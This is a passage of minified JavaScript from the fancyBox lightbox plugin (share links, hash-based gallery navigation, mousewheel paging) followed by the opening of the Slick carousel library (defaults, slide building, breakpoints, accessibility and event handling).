    o && ("function" === r.type(o.opts.share.url) && (e = o.opts.share.url.apply(o, [i, o])), t = o.opts.share.tpl.replace(/\{\{media\}\}/g, "image" === o.type ? encodeURIComponent(o.src) : "").replace(/\{\{url\}\}/g, encodeURIComponent(e)).replace(/\{\{url_raw\}\}/g, (n = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#39;",
      "/": "&#x2F;",
      "`": "&#x60;",
      "=": "&#x3D;"
    }, String(e).replace(/[&<>"'`=\/]/g, function (e) {
      return n[e];
    }))).replace(/\{\{descr\}\}/g, i.$caption ? encodeURIComponent(i.$caption.text()) : ""), r.fancybox.open({
      src: i.translate(i, t),
      type: "html",
      opts: {
        animationEffect: !1,
        afterLoad: function (e, t) {
          i.$refs.container.one("beforeClose.fb", function () {
            e.close(null, 0);
          }), t.$content.find(".fancybox-share__links a").click(function () {
            return window.open(this.href, "Share", "width=550, height=450"), !1;
          });
        }
      }
    }));
  });
}(document, window.jQuery || jQuery), function (r, a, o) {
  "use strict";

  function s() {
    var e = a.location.hash.substr(1),
      t = e.split("-"),
      n = 1 < t.length && /^\+?\d+$/.test(t[t.length - 1]) && parseInt(t.pop(-1), 10) || 1;
    return {
      hash: e,
      index: n < 1 ? 1 : n,
      gallery: t.join("-")
    };
  }
  function t(e) {
    "" !== e.gallery && o("[data-fancybox='" + o.escapeSelector(e.gallery) + "']").eq(e.index - 1).trigger("click.fb-start");
  }
  function l(e) {
    var t, n;
    return !!e && "" !== (n = (t = e.current ? e.current.opts : e.opts).hash || (t.$orig ? t.$orig.data("fancybox") : "")) && n;
  }
  o.escapeSelector || (o.escapeSelector = function (e) {
    return (e + "").replace(/([\0-\x1f\x7f]|^-?\d)|^-$|[^\x80-\uFFFF\w-]/g, function (e, t) {
      return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e;
    });
  }), o(function () {
    !1 !== o.fancybox.defaults.hash && (o(r).on({
      "onInit.fb": function (e, t) {
        var n, i;
        !1 !== t.group[t.currIndex].opts.hash && (n = s(), (i = l(t)) && n.gallery && i == n.gallery && (t.currIndex = n.index - 1));
      },
      "beforeShow.fb": function (e, t, n, i) {
        var o;
        !n || !1 === n.opts.hash || (o = l(t)) && (t.currentHash = o + (1 < t.group.length ? "-" + (n.index + 1) : ""), a.location.hash !== "#" + t.currentHash && (t.origHash || (t.origHash = a.location.hash), t.hashTimer && clearTimeout(t.hashTimer), t.hashTimer = setTimeout(function () {
          "replaceState" in a.history ? (a.history[i ? "pushState" : "replaceState"]({}, r.title, a.location.pathname + a.location.search + "#" + t.currentHash), i && (t.hasCreatedHistory = !0)) : a.location.hash = t.currentHash, t.hashTimer = null;
        }, 300)));
      },
      "beforeClose.fb": function (e, t, n) {
        !1 !== n.opts.hash && (l(t), t.currentHash && t.hasCreatedHistory ? a.history.back() : t.currentHash && ("replaceState" in a.history ? a.history.replaceState({}, r.title, a.location.pathname + a.location.search + (t.origHash || "")) : a.location.hash = t.origHash), t.currentHash = null, clearTimeout(t.hashTimer));
      }
    }), o(a).on("hashchange.fb", function () {
      var i,
        e = s();
      o.each(o(".fancybox-container").get().reverse(), function (e, t) {
        var n = o(t).data("FancyBox");
        if (n.currentHash) return i = n, !1;
      }), i ? !i.currentHash || i.currentHash === e.gallery + "-" + e.index || 1 === e.index && i.currentHash == e.gallery || (i.currentHash = null, i.close()) : "" !== e.gallery && t(e);
    }), setTimeout(function () {
      o.fancybox.getInstance() || t(s());
    }, 50));
  });
}(document, window, window.jQuery || jQuery), function (e, t) {
  "use strict";

  var o = new Date().getTime();
  t(e).on({
    "onInit.fb": function (e, i, t) {
      i.$refs.stage.on("mousewheel DOMMouseScroll wheel MozMousePixelScroll", function (e) {
        var t = i.current,
          n = new Date().getTime();
        i.group.length < 2 || !1 === t.opts.wheel || "auto" === t.opts.wheel && "image" !== t.type || (e.preventDefault(), e.stopPropagation(), t.$slide.hasClass("fancybox-animated") || (e = e.originalEvent || e, n - o < 250 || (o = n, i[(-e.deltaY || -e.deltaX || e.wheelDelta || -e.detail) < 0 ? "next" : "previous"]())));
      });
    }
  });
}(document, window.jQuery || jQuery), function (e) {
  "use strict";

  "function" == typeof define && define.amd ? define(["jquery"], e) : "undefined" != typeof exports ? module.exports = e(require("jquery")) : e(jQuery);
}(function (d) {
  "use strict";

  var o,
    r = window.Slick || {};
  (o = 0, r = function (e, t) {
    var n,
      i = this;
    i.defaults = {
      accessibility: !0,
      adaptiveHeight: !1,
      appendArrows: d(e),
      appendDots: d(e),
      arrows: !0,
      asNavFor: null,
      prevArrow: '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
      nextArrow: '<button class="slick-next" aria-label="Next" type="button">Next</button>',
      autoplay: !1,
      autoplaySpeed: 3e3,
      centerMode: !1,
      centerPadding: "50px",
      cssEase: "ease",
      customPaging: function (e, t) {
        return d('<button type="button" />').text(t + 1);
      },
      dots: !1,
      dotsClass: "slick-dots",
      draggable: !0,
      easing: "linear",
      edgeFriction: .35,
      fade: !1,
      focusOnSelect: !1,
      focusOnChange: !1,
      infinite: !0,
      initialSlide: 0,
      lazyLoad: "ondemand",
      mobileFirst: !1,
      pauseOnHover: !0,
      pauseOnFocus: !0,
      pauseOnDotsHover: !1,
      respondTo: "window",
      responsive: null,
      rows: 1,
      rtl: !1,
      slide: "",
      slidesPerRow: 1,
      slidesToShow: 1,
      slidesToScroll: 1,
      speed: 500,
      swipe: !0,
      swipeToSlide: !1,
      touchMove: !0,
      touchThreshold: 5,
      useCSS: !0,
      useTransform: !0,
      variableWidth: !1,
      vertical: !1,
      verticalSwiping: !1,
      waitForAnimate: !0,
      zIndex: 1e3
    }, i.initials = {
      animating: !1,
      dragging: !1,
      autoPlayTimer: null,
      currentDirection: 0,
      currentLeft: null,
      currentSlide: 0,
      direction: 1,
      $dots: null,
      listWidth: null,
      listHeight: null,
      loadIndex: 0,
      $nextArrow: null,
      $prevArrow: null,
      scrolling: !1,
      slideCount: null,
      slideWidth: null,
      $slideTrack: null,
      $slides: null,
      sliding: !1,
      slideOffset: 0,
      swipeLeft: null,
      swiping: !1,
      $list: null,
      touchObject: {},
      transformsEnabled: !1,
      unslicked: !1
    }, d.extend(i, i.initials), i.activeBreakpoint = null, i.animType = null, i.animProp = null, i.breakpoints = [], i.breakpointSettings = [], i.cssTransitions = !1, i.focussed = !1, i.interrupted = !1, i.hidden = "hidden", i.paused = !0, i.positionProp = null, i.respondTo = null, i.rowCount = 1, i.shouldClick = !0, i.$slider = d(e), i.$slidesCache = null, i.transformType = null, i.transitionType = null, i.visibilityChange = "visibilitychange", i.windowWidth = 0, i.windowTimer = null, n = d(e).data("slick") || {}, i.options = d.extend({}, i.defaults, t, n), i.currentSlide = i.options.initialSlide, i.originalSettings = i.options, void 0 !== document.mozHidden ? (i.hidden = "mozHidden", i.visibilityChange = "mozvisibilitychange") : void 0 !== document.webkitHidden && (i.hidden = "webkitHidden", i.visibilityChange = "webkitvisibilitychange"), i.autoPlay = d.proxy(i.autoPlay, i), i.autoPlayClear = d.proxy(i.autoPlayClear, i), i.autoPlayIterator = d.proxy(i.autoPlayIterator, i), i.changeSlide = d.proxy(i.changeSlide, i), i.clickHandler = d.proxy(i.clickHandler, i), i.selectHandler = d.proxy(i.selectHandler, i), i.setPosition = d.proxy(i.setPosition, i), i.swipeHandler = d.proxy(i.swipeHandler, i), i.dragHandler = d.proxy(i.dragHandler, i), i.keyHandler = d.proxy(i.keyHandler, i), i.instanceUid = o++, i.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/, i.registerBreakpoints(), i.init(!0);
  }).prototype.activateADA = function () {
    this.$slideTrack.find(".slick-active").attr({
      "aria-hidden": "false"
    }).find("a, input, button, select").attr({
      tabindex: "0"
    });
  }, r.prototype.addSlide = r.prototype.slickAdd = function (e, t, n) {
    var i = this;
    if ("boolean" == typeof t) n = t, t = null;else if (t < 0 || t >= i.slideCount) return !1;
    i.unload(), "number" == typeof t ? 0 === t && 0 === i.$slides.length ? d(e).appendTo(i.$slideTrack) : n ? d(e).insertBefore(i.$slides.eq(t)) : d(e).insertAfter(i.$slides.eq(t)) : !0 === n ? d(e).prependTo(i.$slideTrack) : d(e).appendTo(i.$slideTrack), i.$slides = i.$slideTrack.children(this.options.slide), i.$slideTrack.children(this.options.slide).detach(), i.$slideTrack.append(i.$slides), i.$slides.each(function (e, t) {
      d(t).attr("data-slick-index", e);
    }), i.$slidesCache = i.$slides, i.reinit();
  }, r.prototype.animateHeight = function () {
    if (1 === this.options.slidesToShow && !0 === this.options.adaptiveHeight && !1 === this.options.vertical) {
      var e = this.$slides.eq(this.currentSlide).outerHeight(!0);
      this.$list.animate({
        height: e
      }, this.options.speed);
    }
  }, r.prototype.animateSlide = function (e, t) {
    var n = {},
      i = this;
    i.animateHeight(), !0 === i.options.rtl && !1 === i.options.vertical && (e = -e), !1 === i.transformsEnabled ? !1 === i.options.vertical ? i.$slideTrack.animate({
      left: e
    }, i.options.speed, i.options.easing, t) : i.$slideTrack.animate({
      top: e
    }, i.options.speed, i.options.easing, t) : !1 === i.cssTransitions ? (!0 === i.options.rtl && (i.currentLeft = -i.currentLeft), d({
      animStart: i.currentLeft
    }).animate({
      animStart: e
    }, {
      duration: i.options.speed,
      easing: i.options.easing,
      step: function (e) {
        e = Math.ceil(e), !1 === i.options.vertical ? n[i.animType] = "translate(" + e + "px, 0px)" : n[i.animType] = "translate(0px," + e + "px)", i.$slideTrack.css(n);
      },
      complete: function () {
        t && t.call();
      }
    })) : (i.applyTransition(), e = Math.ceil(e), !1 === i.options.vertical ? n[i.animType] = "translate3d(" + e + "px, 0px, 0px)" : n[i.animType] = "translate3d(0px," + e + "px, 0px)", i.$slideTrack.css(n), t && setTimeout(function () {
      i.disableTransition(), t.call();
    }, i.options.speed));
  }, r.prototype.getNavTarget = function () {
    var e = this.options.asNavFor;
    return e && null !== e && (e = d(e).not(this.$slider)), e;
  }, r.prototype.asNavFor = function (t) {
    var e = this.getNavTarget();
    null !== e && "object" == typeof e && e.each(function () {
      var e = d(this).slick("getSlick");
      e.unslicked || e.slideHandler(t, !0);
    });
  }, r.prototype.applyTransition = function (e) {
    var t = this,
      n = {};
    !1 === t.options.fade ? n[t.transitionType] = t.transformType + " " + t.options.speed + "ms " + t.options.cssEase : n[t.transitionType] = "opacity " + t.options.speed + "ms " + t.options.cssEase, !1 === t.options.fade ? t.$slideTrack.css(n) : t.$slides.eq(e).css(n);
  }, r.prototype.autoPlay = function () {
    this.autoPlayClear(), this.slideCount > this.options.slidesToShow && (this.autoPlayTimer = setInterval(this.autoPlayIterator, this.options.autoplaySpeed));
  }, r.prototype.autoPlayClear = function () {
    this.autoPlayTimer && clearInterval(this.autoPlayTimer);
  }, r.prototype.autoPlayIterator = function () {
    var e = this,
      t = e.currentSlide + e.options.slidesToScroll;
    e.paused || e.interrupted || e.focussed || (!1 === e.options.infinite && (1 === e.direction && e.currentSlide + 1 === e.slideCount - 1 ? e.direction = 0 : 0 === e.direction && (t = e.currentSlide - e.options.slidesToScroll, e.currentSlide - 1 == 0 && (e.direction = 1))), e.slideHandler(t));
  }, r.prototype.buildArrows = function () {
    var e = this;
    !0 === e.options.arrows && (e.$prevArrow = d(e.options.prevArrow).addClass("slick-arrow"), e.$nextArrow = d(e.options.nextArrow).addClass("slick-arrow"), e.slideCount > e.options.slidesToShow ? (e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.prependTo(e.options.appendArrows), e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.appendTo(e.options.appendArrows), !0 !== e.options.infinite && e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({
      "aria-disabled": "true",
      tabindex: "-1"
    }));
  }, r.prototype.buildDots = function () {
    var e, t;
    if (!0 === this.options.dots) {
      for (this.$slider.addClass("slick-dotted"), t = d("<ul />").addClass(this.options.dotsClass), e = 0; e <= this.getDotCount(); e += 1) t.append(d("<li />").append(this.options.customPaging.call(this, this, e)));
      this.$dots = t.appendTo(this.options.appendDots), this.$dots.find("li").first().addClass("slick-active");
    }
  }, r.prototype.buildOut = function () {
    var e = this;
    e.$slides = e.$slider.children(e.options.slide + ":not(.slick-cloned)").addClass("slick-slide"), e.slideCount = e.$slides.length, e.$slides.each(function (e, t) {
      d(t).attr("data-slick-index", e).data("originalStyling", d(t).attr("style") || "");
    }), e.$slider.addClass("slick-slider"), e.$slideTrack = 0 === e.slideCount ? d('<div class="slick-track"/>').appendTo(e.$slider) : e.$slides.wrapAll('<div class="slick-track"/>').parent(), e.$list = e.$slideTrack.wrap('<div class="slick-list"/>').parent(), e.$slideTrack.css("opacity", 0), !0 !== e.options.centerMode && !0 !== e.options.swipeToSlide || (e.options.slidesToScroll = 1), d("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"), e.setupInfinite(), e.buildArrows(), e.buildDots(), e.updateDots(), e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0), !0 === e.options.draggable && e.$list.addClass("draggable");
  }, r.prototype.buildRows = function () {
    var e,
      t,
      n,
      i,
      o,
      r,
      a,
      s = this;
    if (i = document.createDocumentFragment(), r = s.$slider.children(), 1 < s.options.rows) {
      for (a = s.options.slidesPerRow * s.options.rows, o = Math.ceil(r.length / a), e = 0; e < o; e++) {
        var l = document.createElement("div");
        for (t = 0; t < s.options.rows; t++) {
          var d = document.createElement("div");
          for (n = 0; n < s.options.slidesPerRow; n++) {
            var c = e * a + (t * s.options.slidesPerRow + n);
            r.get(c) && d.appendChild(r.get(c));
          }
          l.appendChild(d);
        }
        i.appendChild(l);
      }
      s.$slider.empty().append(i), s.$slider.children().children().children().css({
        width: 100 / s.options.slidesPerRow + "%",
        display: "inline-block"
      });
    }
  }, r.prototype.checkResponsive = function (e, t) {
    var n,
      i,
      o,
      r = this,
      a = !1,
      s = r.$slider.width(),
      l = window.innerWidth || d(window).width();
    if ("window" === r.respondTo ? o = l : "slider" === r.respondTo ? o = s : "min" === r.respondTo && (o = Math.min(l, s)), r.options.responsive && r.options.responsive.length && null !== r.options.responsive) {
      for (n in i = null, r.breakpoints) r.breakpoints.hasOwnProperty(n) && (!1 === r.originalSettings.mobileFirst ? o < r.breakpoints[n] && (i = r.breakpoints[n]) : o > r.breakpoints[n] && (i = r.breakpoints[n]));
      null !== i ? null !== r.activeBreakpoint ? i === r.activeBreakpoint && !t || (r.activeBreakpoint = i, "unslick" === r.breakpointSettings[i] ? r.unslick(i) : (r.options = d.extend({}, r.originalSettings, r.breakpointSettings[i]), !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e)), a = i) : (r.activeBreakpoint = i, "unslick" === r.breakpointSettings[i] ? r.unslick(i) : (r.options = d.extend({}, r.originalSettings, r.breakpointSettings[i]), !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e)), a = i) : null !== r.activeBreakpoint && (r.activeBreakpoint = null, r.options = r.originalSettings, !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e), a = i), e || !1 === a || r.$slider.trigger("breakpoint", [r, a]);
    }
  }, r.prototype.changeSlide = function (e, t) {
    var n,
      i,
      o = this,
      r = d(e.currentTarget);
    switch (r.is("a") && e.preventDefault(), r.is("li") || (r = r.closest("li")), n = o.slideCount % o.options.slidesToScroll != 0 ? 0 : (o.slideCount - o.currentSlide) % o.options.slidesToScroll, e.data.message) {
      case "previous":
        i = 0 == n ? o.options.slidesToScroll : o.options.slidesToShow - n, o.slideCount > o.options.slidesToShow && o.slideHandler(o.currentSlide - i, !1, t);
        break;
      case "next":
        i = 0 == n ? o.options.slidesToScroll : n, o.slideCount > o.options.slidesToShow && o.slideHandler(o.currentSlide + i, !1, t);
        break;
      case "index":
        var a = 0 === e.data.index ? 0 : e.data.index || r.index() * o.options.slidesToScroll;
        o.slideHandler(o.checkNavigable(a), !1, t), r.children().trigger("focus");
        break;
      default:
        return;
    }
  }, r.prototype.checkNavigable = function (e) {
    var t, n;
    if (n = 0, e > (t = this.getNavigableIndexes())[t.length - 1]) e = t[t.length - 1];else for (var i in t) {
      if (e < t[i]) {
        e = n;
        break;
      }
      n = t[i];
    }
    return e;
  }, r.prototype.cleanUpEvents = function () {
    var e = this;
    e.options.dots && null !== e.$dots && (d("li", e.$dots).off("click.slick", e.changeSlide).off("mouseenter.slick", d.proxy(e.interrupt, e, !0)).off("mouseleave.slick", d.proxy(e.interrupt, e, !1)), !0 === e.options.accessibility && e.$dots.off("keydown.slick", e.keyHandler)), e.$slider.off("focus.slick blur.slick"), !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide), e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide), !0 === e.options.accessibility && (e.$prevArrow && e.$prevArrow.off("keydown.slick", e.keyHandler), e.$nextArrow && e.$nextArrow.off("keydown.slick", e.keyHandler))), e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler), e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler), e.$list.off("touchend.slick mouseup.slick", e.swipeHandler), e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler), e.$list.off("click.slick", e.clickHandler), d(document).off(e.visibilityChange, e.visibility), e.cleanUpSlideEvents(), !0 === e.options.accessibility && e.$list.off("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && d(e.$slideTrack).children().off("click.slick", e.selectHandler), d(window).off("orientationchange.slick.slick-" + e.instanceUid, e.orientationChange), d(window).off("resize.slick.slick-" + e.instanceUid, e.resize), d("[draggable!=true]", e.$slideTrack).off("dragstart", e.preventDefault), d(window).off("load.slick.slick-" + e.instanceUid, e.setPosition);
  }, r.prototype.cleanUpSlideEvents = function () {
    this.$list.off("mouseenter.slick", d.proxy(this.interrupt, this, !0)), this.$list.off("mouseleave.slick", d.proxy(this.interrupt, this, !1));
  }, r.prototype.cleanUpRows = function () {
    var e;
    1 < this.options.rows && ((e = this.$slides.children().children()).removeAttr("style"), this.$slider.empty().append(e));
  }, r.prototype.clickHandler = function (e) {
    !1 === this.shouldClick && (e.stopImmediatePropagation(), e.stopPropagation(), e.preventDefault());
  }, r.prototype.destroy = function (e) {
    var t = this;
    t.autoPlayClear(), t.touchObject = {}, t.cleanUpEvents(), d(".slick-cloned", t.$slider).detach(), t.$dots && t.$dots.remove(), t.$prevArrow && t.$prevArrow.length && (t.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.remove()), t.$nextArrow && t.$nextArrow.length && (t.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.remove()), t.$slides && (t.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function () {
      d(this).attr("style", d(this).data("originalStyling"));
    }), t.$slideTrack.children(this.options.slide).detach(), t.$slideTrack.detach(), t.$list.detach(), t.$slider.append(t.$slides)), t.cleanUpRows(), t.$slider.removeClass("slick-slider"), t.$slider.removeClass("slick-initialized"), t.$slider.removeClass("slick-dotted"), t.unslicked = !0, e || t.$slider.trigger("destroy", [t]);
  }, r.prototype.disableTransition = function (e) {
    var t = {};
    t[this.transitionType] = "", !1 === this.options.fade ? this.$slideTrack.css(t) : this.$slides.eq(e).css(t);
  }, r.prototype.fadeSlide = function (e, t) {
    var n = this;
    !1 === n.cssTransitions ? (n.$slides.eq(e).css({
      zIndex: n.options.zIndex
    }), n.$slides.eq(e).animate({
      opacity: 1
    }, n.options.speed, n.options.easing, t)) : (n.applyTransition(e), n.$slides.eq(e).css({
      opacity: 1,
      zIndex: n.options.zIndex
    }), t && setTimeout(function () {
      n.disableTransition(e), t.call();
    }, n.options.speed));
  }, r.prototype.fadeSlideOut = function (e) {
    !1 === this.cssTransitions ? this.$slides.eq(e).animate({
      opacity: 0,
      zIndex: this.options.zIndex - 2
    }, this.options.speed, this.options.easing) : (this.applyTransition(e), this.$slides.eq(e).css({
      opacity: 0,
      zIndex: this.options.zIndex - 2
    }));
  }, r.prototype.filterSlides = r.prototype.slickFilter = function (e) {
    null !== e && (this.$slidesCache = this.$slides, this.unload(), this.$slideTrack.children(this.options.slide).detach(), this.$slidesCache.filter(e).appendTo(this.$slideTrack), this.reinit());
  }, r.prototype.focusHandler = function () {
    var n = this;
    n.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*", function (e) {
      e.stopImmediatePropagation();
      var t = d(this);
      setTimeout(function () {
        n.options.pauseOnFocus && (n.focussed = t.is(":focus"), n.autoPlay());
      }, 0);
    });
  }, r.prototype.getCurrent = r.prototype.slickCurrentSlide = function () {
    return this.currentSlide;
  }, r.prototype.getDotCount = function () {
    var e = this,
      t = 0,
      n = 0,
      i = 0;
    if (!0 === e.options.infinite) {
      if (e.slideCount <= e.options.slidesToShow) ++i;else for (; t < e.slideCount;) ++i, t = n + e.options.slidesToScroll, n += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
    } else if (!0 === e.options.centerMode) i = e.slideCount;else if (e.options.asNavFor) for (; t < e.slideCount;) ++i, t = n + e.options.slidesToScroll, n += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;else i = 1 + Math.ceil((e.slideCount - e.options.slidesToShow) / e.options.slidesToScroll);
    return i - 1;
  }, r.prototype.getLeft = function (e) {
    var t,
      n,
      i,
      o,
      r = this,
      a = 0;
    return r.slideOffset = 0, n = r.$slides.first().outerHeight(!0), !0 === r.options.infinite ? (r.slideCount > r.options.slidesToShow && (r.slideOffset = r.slideWidth * r.options.slidesToShow * -1, o = -1, !0 === r.options.vertical && !0 === r.options.centerMode && (2 === r.options.slidesToShow ? o = -1.5 : 1 === r.options.slidesToShow && (o = -2)), a = n * r.options.slidesToShow * o), r.slideCount % r.options.slidesToScroll != 0 && e + r.options.slidesToScroll > r.slideCount && r.slideCount > r.options.slidesToShow && (a = e > r.slideCount ? (r.slideOffset = (r.options.slidesToShow - (e - r.slideCount)) * r.slideWidth * -1, (r.options.slidesToShow - (e - r.slideCount)) * n * -1) : (r.slideOffset = r.slideCount % r.options.slidesToScroll * r.slideWidth * -1, r.slideCount % r.options.slidesToScroll * n * -1))) : e + r.options.slidesToShow > r.slideCount && (r.slideOffset = (e + r.options.slidesToShow - r.slideCount) * r.slideWidth, a = (e + r.options.slidesToShow - r.slideCount) * n), r.slideCount <= r.options.slidesToShow && (a = r.slideOffset = 0), !0 === r.options.centerMode && r.slideCount <= r.options.slidesToShow ? r.slideOffset = r.slideWidth * Math.floor(r.options.slidesToShow) / 2 - r.slideWidth * r.slideCount / 2 : !0 === r.options.centerMode && !0 === r.options.infinite ? r.slideOffset += r.slideWidth * Math.floor(r.options.slidesToShow / 2) - r.slideWidth : !0 === r.options.centerMode && (r.slideOffset = 0, r.slideOffset += r.slideWidth * Math.floor(r.options.slidesToShow / 2)), t = !1 === r.options.vertical ? e * r.slideWidth * -1 + r.slideOffset : e * n * -1 + a, !0 === r.options.variableWidth && (i = r.slideCount <= r.options.slidesToShow || !1 === r.options.infinite ? r.$slideTrack.children(".slick-slide").eq(e) : r.$slideTrack.children(".slick-slide").eq(e + r.options.slidesToShow), t = !0 === r.options.rtl ? i[0] ? -1 * (r.$slideTrack.width() - i[0].offsetLeft - i.width()) : 0 : i[0] ? -1 * i[0].offsetLeft : 0, !0 === r.options.centerMode && (i = r.slideCount <= r.options.slidesToShow || !1 === r.options.infinite ? r.$slideTrack.children(".slick-slide").eq(e) : r.$slideTrack.children(".slick-slide").eq(e + r.options.slidesToShow + 1), t = !0 === r.options.rtl ? i[0] ? -1 * (r.$slideTrack.width() - i[0].offsetLeft - i.width()) : 0 : i[0] ? -1 * i[0].offsetLeft : 0, t += (r.$list.width() - i.outerWidth()) / 2)), t;
  }, r.prototype.getOption = r.prototype.slickGetOption = function (e) {
    return this.options[e];
  }, r.prototype.getNavigableIndexes = function () {
    var e,
      t = this,
      n = 0,
      i = 0,
      o = [];
    for (e = !1 === t.options.infinite ? t.slideCount : (n = -1 * t.options.slidesToScroll, i = -1 * t.options.slidesToScroll, 2 * t.slideCount); n < e;) o.push(n), n = i + t.options.slidesToScroll, i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow;
    return o;
  }, r.prototype.getSlick = function () {
    return this;
  }, r.prototype.getSlideCount = function () {
    var n,
      i,
      o = this;
    return i = !0 === o.options.centerMode ? o.slideWidth * Math.floor(o.options.slidesToShow / 2) : 0, !0 === o.options.swipeToSlide ? (o.$slideTrack.find(".slick-slide").each(function (e, t) {
      if (t.offsetLeft - i + d(t).outerWidth() / 2 > -1 * o.swipeLeft) return n = t, !1;
    }), Math.abs(d(n).attr("data-slick-index") - o.currentSlide) || 1) : o.options.slidesToScroll;
  }, r.prototype.goTo = r.prototype.slickGoTo = function (e, t) {
    this.changeSlide({
      data: {
        message: "index",
        index: parseInt(e)
      }
    }, t);
  }, r.prototype.init = function (e) {
    var t = this;
    d(t.$slider).hasClass("slick-initialized") || (d(t.$slider).addClass("slick-initialized"), t.buildRows(), t.buildOut(), t.setProps(), t.startLoad(), t.loadSlider(), t.initializeEvents(), t.updateArrows(), t.updateDots(), t.checkResponsive(!0), t.focusHandler()), e && t.$slider.trigger("init", [t]), !0 === t.options.accessibility && t.initADA(), t.options.autoplay && (t.paused = !1, t.autoPlay());
  }, r.prototype.initADA = function () {
    var n = this,
      i = Math.ceil(n.slideCount / n.options.slidesToShow),
      o = n.getNavigableIndexes().filter(function (e) {
        return 0 <= e && e < n.slideCount;
      });
    n.$slides.add(n.$slideTrack.find(".slick-cloned")).attr({
      "aria-hidden": "true",
      tabindex: "-1"
    }).find("a, input, button, select").attr({
      tabindex: "-1"
    }), null !== n.$dots && (n.$slides.not(n.$slideTrack.find(".slick-cloned")).each(function (e) {
      var t = o.indexOf(e);
      d(this).attr({
        role: "tabpanel",
        id: "slick-slide" + n.instanceUid + e,
        tabindex: -1
      }), -1 !== t && d(this).attr({
        "aria-describedby": "slick-slide-control" + n.instanceUid + t
      });
    }), n.$dots.attr("role", "tablist").find("li").each(function (e) {
      var t = o[e];
      d(this).attr({
        role: "presentation"
      }), d(this).find("button").first().attr({
        role: "tab",
        id: "slick-slide-control" + n.instanceUid + e,
        "aria-controls": "slick-slide" + n.instanceUid + t,
        "aria-label": e + 1 + " of " + i,
        "aria-selected": null,
        tabindex: "-1"
      });
    }).eq(n.currentSlide).find("button").attr({
      "aria-selected": "true",
      tabindex: "0"
    }).end());
    for (var e = n.currentSlide, t = e + n.options.slidesToShow; e < t; e++) n.$slides.eq(e).attr("tabindex", 0);
    n.activateADA();
  }, r.prototype.initArrowEvents = function () {
    var e = this;
    !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.off("click.slick").on("click.slick", {
      message: "previous"
    }, e.changeSlide), e.$nextArrow.off("click.slick").on("click.slick", {
      message: "next"
    }, e.changeSlide), !0 === e.options.accessibility && (e.$prevArrow.on("keydown.slick", e.keyHandler), e.$nextArrow.on("keydown.slick", e.keyHandler)));
  }, r.prototype.initDotEvents = function () {
    var e = this;
    !0 === e.options.dots && (d("li", e.$dots).on("click.slick", {
      message: "index"
    }, e.changeSlide), !0 === e.options.accessibility && e.$dots.on("keydown.slick", e.keyHandler)), !0 === e.options.dots && !0 === e.options.pauseOnDotsHover && d("li", e.$dots).on("mouseenter.slick", d.proxy(e.interrupt, e, !0)).on("mouseleave.slick", d.proxy(e.interrupt, e, !1));
  }, r.prototype.initSlideEvents = function () {
    this.options.pauseOnHover && (this.$list.on("mouseenter.slick", d.proxy(this.interrupt, this, !0)), this.$list.on("mouseleave.slick", d.proxy(this.interrupt, this, !1)));
  }, r.prototype.initializeEvents = function () {
    var e = this;
    e.initArrowEvents(), e.initDotEvents(), e.initSlideEvents(), e.$list.on("touchstart.slick mousedown.slick", {
      action: "start"
    }, e.swipeHandler), e.$list.on("touchmove.slick mousemove.slick", {
      action: "move"
    }, e.swipeHandler), e.$list.on("touchend.slick mouseup.slick", {
      action: "end"
    }, e.swipeHandler), e.$list.on("touchcancel.slick mouseleave.slick", {
      action: "end"
    }, e.swipeHandler), e.$list.on("click.slick", e.clickHandler), d(document).on(e.visibilityChange, d.proxy(e.visibility, e)), !0 === e.options.accessibility && e.$list.on("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && d(e.$slideTrack).children().on("click.slick", e.selectHandler), d(window).on("orientationchange.slick.slick-" + e.instanceUid, d.proxy(e.orientationChange, e)), d(window).on("resize.slick.slick-" + e.instanceUid, d.proxy(e.resize, e)), d("[draggable!=true]", e.$slideTrack).on("dragstart", e.preventDefault), d(window).on("load.slick.slick-" + e.instanceUid, e.setPosition), d(e.setPosition);
  }, r.prototype.initUI = function () {
    !0 === this.options.arrows && this.slideCount > this.options.slidesToShow && (this.$prevArrow.show(), this.$nextArrow.show()), !0 === this.options.dots && this.slideCount > this.options.slidesToShow && this.$dots.show();
  }, r.prototype.keyHandler = function (e) {
    e.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === e.keyCode && !0 === this.options.accessibility ? this.changeSlide({
      data: {
        message: !0 === this.options.rtl ? "next" : "previous"
